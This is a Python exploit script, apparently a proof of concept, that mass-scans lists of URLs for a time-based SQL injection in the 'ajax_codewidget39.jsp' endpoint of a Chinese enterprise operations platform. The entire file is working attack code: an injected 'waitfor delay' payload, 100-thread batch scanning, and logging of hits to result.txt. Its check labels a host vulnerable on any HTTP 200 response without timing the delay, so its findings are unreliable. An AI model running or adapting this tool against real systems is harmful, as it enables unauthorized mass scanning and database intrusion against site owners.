import requests,argparse,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()


def banner():
    test = """
                                                       ______
        ______________________________________________ ___  /
        ___  __ \  _ \_  ___/_  ___/  __ \_  __ \  __ `/_  / 
        __  /_/ /  __/  /   _(__  )/ /_/ /  / / / /_/ /_  /  
        _  .___/\___//_/    /____/ \____//_/ /_/\__,_/ /_/   
        /_/                                                  
                                           author:NaA100
                                           date:2024-09-13
                                           version:1.0                    
        """
    print(test)

def main():
    banner()
    parser = argparse.ArgumentParser(description='某企互联-FE企业运营管理平台 ajax_codewidget39 SQL注入漏洞')
    parser.add_argument('-u','--url',dest='url',type=str,help='please input your url')
    parser.add_argument('-f','--file',dest='file',type=str,help='please input your file.txt')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list=[]
        with open(args.file,"r",encoding="utf-8") as f:
            for url in f.readlines():
                url_list.append(url.strip().replace("\n",""))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"您的输入有误，请使用python file_name.py -h for help")
def poc(target):
    url = target+'/common/ajax_codewidget39.jsp;.js?code=1%27;waitfor+delay+%270:0:5%27--+'
    headers={
        "Cache-Control": "max-age=0", 
        "Upgrade-Insecure-Requests": "1", 
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36", 
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", 
        "Accept-Encoding": "gzip, deflate, br", 
        "Accept-Language": "zh-CN,zh;q=0.9", 
        "Connection": "close"
        }
    try:
        res = requests.get(url,headers=headers,verify=False)
        if res.status_code == 200 :
            print(f"[+]该url{target}存在 SQL注入漏洞")
            with open("result.txt", "a+", encoding="utf-8") as f:
                f.write(target+"\n")
        else:
            print(f"[-]该url{target}不存在 SQL注入漏洞")
    except Exception as e:
        print(f"[*] 该url出现错误:{target}, 错误信息：{str(e)}")
if __name__ == '__main__':
    main()